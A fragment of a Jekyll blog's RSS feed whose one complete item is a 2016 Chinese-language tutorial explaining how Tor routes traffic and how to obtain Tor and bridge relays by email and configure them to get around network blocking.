        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>Tor的介绍及使用</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;Tor究竟是如何运行的呢？其实很简单。你用Tor client（客户端）发送一个多层加密网络请求，
随机指向一台Tor node（节点）帮你传送到目标主机上。node把这个请求的最外层解密，
再随机发送到第二台node……这样重复经过3个node，最后到达目标主机。
什么意思呢？简单的说就是你要发一封匿名信，你不自己送，也不叫邮差送。而在大街上随
便找一个陌生人，陌生人再找另外一个陌生人，最后经过3个陌生人之手，达到对方手中。
这样，检测难度就会更大，block的风险就会越小。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;但是，正是因为安全性高，所以，设置起来也是三种方法中最难的。
现在，就来教大家一种永久的使用方法。&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;注册一个Yahoo！邮箱（必须是Yahoo！邮箱，除非你能使用Gmail）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;发送主题为“help”的纯文本邮件到gettor@torproject.org，收到
回复后根据邮件的提示再回复一次，即可在你的邮箱中收取Tor的软件
包。切记要用纯文本的邮件格式。（获得的为英文版，如想获得中文
版请参照Blog最后，不保证能访问）&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;给bridges@torproject.org 发送一封邮件（用纯文本格式），邮件
的标题和正文写上get bridges（注意当中有空格）。这样就可以获得
bridge（网桥）中继，也就是node。如需指定网桥类型在get bridges
后面加上类型即可。如：get bridges obfs3(在正文中也要这么写)&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;获得了这些后，我们就要开始设置了。
首先，安装好Tor（卸载时直接删除其文件夹即可）。&lt;/p&gt;

&lt;p&gt;然后在安装完成后勾选运行（默认勾选），进入设置页面。&lt;/p&gt;

&lt;p&gt;它首先会询问你当前连接互联网是否受限，因为我们被block了，所以
在Connect（直接连接）与Configure（配置）中选则Configure。&lt;/p&gt;

&lt;p&gt;进入下一步，他会询问你ISP（电信运营商）有没有屏蔽互联网接入
因为被block了，所以我们选择Yes（是），点击Next（下一步）。&lt;/p&gt;

&lt;p&gt;下面到了最关键的一步，我们要设置node了，这时候我们需要用到之前
发送邮件得到的bridges，复制邮件中所有的bridges（通常是3个）
通常是这样的格式：IP地址:端口 hash值校验码（数字与大写字母混合）
复制好后我们在这一步中选择Enter custon bridges（自定义网桥中继）
在文本框中粘贴我们复制的bridges。单击Next（下一步）&lt;/p&gt;

&lt;p&gt;最后，他会询问我们是否通过代理连接，这通常是在公司等内部网络使用
我们不需要，选择No（否），最后点击Connect（连接）&lt;/p&gt;

&lt;p&gt;这时，Tor会开始连接，耐心等待后就可以了。
成功后会跳出浏览器，显示Congratulations（成功）&lt;/p&gt;

&lt;p&gt;接下来就交给大家了，如是通过邮件得到的就是英文版本，有不懂得单词
翻译一下。&lt;/p&gt;

&lt;p&gt;如果想获得中文版本的Tor，需要登录Tor官网：&lt;br /&gt;
https://www.torproject.org/ （被block）&lt;br /&gt;
https://www.theonionrouter.com/ （目前可用）&lt;br /&gt;
在Download Tor的页面中把English改成简体字，然后下载
获取网桥过程与使用过程参照上述。&lt;/p&gt;
</description>
        <pubDate>Fri, 26 Aug 2016 08:59:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/08/26/Tor%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/08/26/Tor%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%8F%8A%E4%BD%BF%E7%94%A8.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
  </channel>
</rss>
